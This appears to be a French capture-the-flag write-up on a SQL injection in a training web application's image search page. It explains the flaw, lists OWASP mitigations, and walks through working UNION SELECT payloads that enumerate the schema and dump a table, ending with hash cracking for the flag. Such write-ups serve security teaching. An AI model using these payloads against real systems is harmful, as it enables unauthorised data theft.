# SQL Injection

## URL
/index.php?page=searchimg

## Description
Une attaque par injection SQL consiste à insérer une requête SQL via les données envoyées par le client à l'application. </br>
Une exploitation réussie permet de lire, modifier ou supprimer des données de la base, d'exécuter des opérations d'administration (comme arrêter le SGBD), d'accéder à des fichiers du système ou, dans certains cas, de lancer des commandes sur le système d'exploitation. Les attaques par injection SQL font partie des attaques par injection, où des commandes SQL sont insérées dans les entrées de données pour affecter l'exécution de commandes SQL prédéfinies.
Les attaques par injection SQL permettent aux attaquants de falsifier des identités, manipuler des données, annuler des transactions, divulguer ou détruire des données, ou devenir administrateurs du serveur de base de données. Elles sont fréquentes dans les applications PHP et ASP en raison des interfaces fonctionnelles anciennes. Les applications J2EE et ASP.NET sont moins vulnérables. La gravité de ces attaques dépend des compétences de l'attaquant, mais reste généralement élevée, malgré les mesures de défense. </br>
[Lien OWASP SQL injection](https://owasp.org/www-community/attacks/SQL_Injection)

## Se protéger
1. Utiliser des requêtes préparées (avec paramètres) : Cette méthode sépare les données du code SQL, empêchant ainsi toute modification malveillante des requêtes.
2. Recourir à des procédures stockées sécurisées : Elles permettent d'exécuter des commandes SQL prédéfinies de manière sécurisée, à condition qu'elles ne construisent pas dynamiquement des requêtes avec des entrées non sécurisées.
3. Valider les entrées utilisateur : Appliquer une validation stricte (par exemple, via des listes blanches) pour s'assurer que les données reçues correspondent aux formats attendus, réduisant ainsi le risque d'injection.
4. Limiter les privilèges des comptes de base de données : Attribuer uniquement les permissions nécessaires aux comptes utilisés par l'application, minimisant ainsi l'impact potentiel d'une injection réussie.
5. Éviter l'échappement manuel des entrées : Cette pratique est déconseillée car elle est sujette à des erreurs et peut être insuffisante pour prévenir toutes les formes d'injection.

[Lien OWASP Injection prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
[Lien OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)

## Reproduire la faille

on nous demande d'entrer un identifiant numérique qui correspond au numéro d'une image, probablement un INTEGER.
même procédé que pour la page de membres. D’ailleurs nous retrouvons les mêmes données, il faut simplement qu’on regarde une autre table.

Si on entre 5 on peut voir :

```sql
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

list_images semble pas mal :

```sql
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
Title: id
Url : list_images
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
Title: url
Url : list_images
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
Title: title
Url : list_images
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
Title: comment
Url : list_images

1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images

ID: 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
Title: https://fr.wikipedia.org/wiki/Programme_NsaAn image about the NSA !
Url : 1
ID: 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
Title: https://fr.wikipedia.org/wiki/Fichier:4242 !There is a number..
Url : 2
ID: 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
Title: https://fr.wikipedia.org/wiki/Logo_de_GoGoogleGoogle it !
Url : 3
ID: 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
Title: https://en.wikipedia.org/wiki/Earth#/medEarthEarth!
Url : 4
ID: 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
Title: borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5
```

Décoder depuis [dcode.fr](https://www.dcode.fr/hash-md5):
Déchiffrement du hash MD5 `1928e8083cf461a51303633093573c46` : **albatroz**
Chiffrer `albatroz` en sha256 : `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

